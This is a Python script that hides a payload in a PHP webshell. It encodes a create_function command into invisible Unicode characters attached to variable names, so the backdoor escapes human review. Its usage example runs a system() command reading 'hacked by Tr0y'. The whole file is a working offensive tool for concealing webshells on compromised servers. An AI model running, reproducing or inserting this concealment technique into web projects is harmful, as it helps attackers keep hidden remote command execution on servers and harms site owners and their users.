import re
import sys
import binascii

def put_color(string, color):
    colors = {
        'red': '31',
        'green': '32',
        'yellow': '33',

        'blue': '34',
        'pink': '35',
        'cyan': '36',
        'gray': '2',
        'white': '37',
    }

    return '\033[40;1;%s;40m%s\033[0m' % (colors[color], str(string))

if len(sys.argv) not in [3, 4]:
    sys.exit(
        '''[!] usage: python hidden_webshell.py payload filename [output_filename]\n'''
        '''  [-] example: python {}{}{}'''.format(
            put_color('hidden_webshell.py', 'white'),
            put_color(''' 'system("echo \\"hacked by Tr0y :)\\"");' ''', 'green'),
            put_color('webshell.php', 'blue')
        )
    )

webshell_name = sys.argv[2]
hidden_name = sys.argv[3] if len(sys.argv) == 4 else 'webshell_hidden_pro.php'
exp = sys.argv[1]  # '''system("echo 'hacked by Tr0y :)'");'''
if not exp.endswith(';'):
    print('[!] WARN: {} {}'.format(
        put_color('The payload should end in', 'yellow'),
        put_color(';', 'cyan')
    ))

print('[+] Hide webshell')
print('  [-] Read from {}'.format(put_color(webshell_name, 'blue')))
print('  [-] Payload is {}'.format(put_color(exp, 'green')))

hidden_str = ["឴", "឵"]
# hidden_str = ["K", "k"]
payload = list('create_function' + exp)

with open(webshell_name, 'r') as fp:
    raw_php = fp.readlines()

last_line_num = var_count = 0
last_var = ''
for line_num, content in enumerate(raw_php):
    php_var = re.findall('^\s*(\$[0-9a-zA-Z\_]+)\s+=', content)
    if php_var:
        last_var = php_var[0]
        last_line_num = line_num
        var_count += 1

if not var_count:
    print('[!] ERRO: {}'.format(
        put_color('The PHP file must contains valid $vars', 'red'),
    ))

replaced = {}
for line_num, content in enumerate(raw_php[:last_line_num]):
    if not payload:
        break

    var_tmp = re.findall('^\s*(\$[0-9a-zA-Z\_]+)\s+=', content)
    if var_tmp:
        var = var_tmp[0]
        content = raw_php[line_num]
        char = payload.pop(0)
        # print('隐藏', char, content)
        hex_num = hex(ord(char))
        tab_num = int(hex_num[2], 16)
        space_num = int(hex_num[3], 16)

        # need_replace[var] = var + "\u17B4" * tab_num + "\u17B5" * space_num
        replace_str = var + hidden_str[0] * tab_num + hidden_str[1] * space_num
        replaced[var] = replace_str

    for var in replaced:
        tmp = re.findall(re.escape(var)+'(?![0-9a-zA-Z_])', raw_php[line_num])
        if tmp:
            var_to_replace = tmp[0]
            # print(f'将 {raw_php[line_num]} 中的 {var_to_replace} 替换为 {replaced[var]}')
            raw_php[line_num] = raw_php[line_num].replace(var_to_replace, replaced[var])

if payload:
    replace_str = bin(
        int(binascii.b2a_hex(bytes(''.join(payload), 'utf8')), 16)
    )[2:].replace('0', hidden_str[0]).replace('1', hidden_str[1])
    replaced[last_var] = last_var[:2] + replace_str + last_var[2:]

    for var in replaced:
        tmp = re.findall(re.escape(var)+'(?![0-9a-zA-Z_])', raw_php[last_line_num])
        if tmp:
            var_to_replace = tmp[0]
            # print(f'将 {raw_php[last_line_num]} 中的 {var_to_replace} 替换为 {replaced[var]}')
            raw_php[last_line_num] = raw_php[last_line_num].replace(var_to_replace, replaced[var])

with open(hidden_name, 'w') as fp:
    fp.writelines(raw_php)

print('[!] Saved as {}'.format(put_color(hidden_name, 'blue')))
print('[!] All done\n\nBye :)')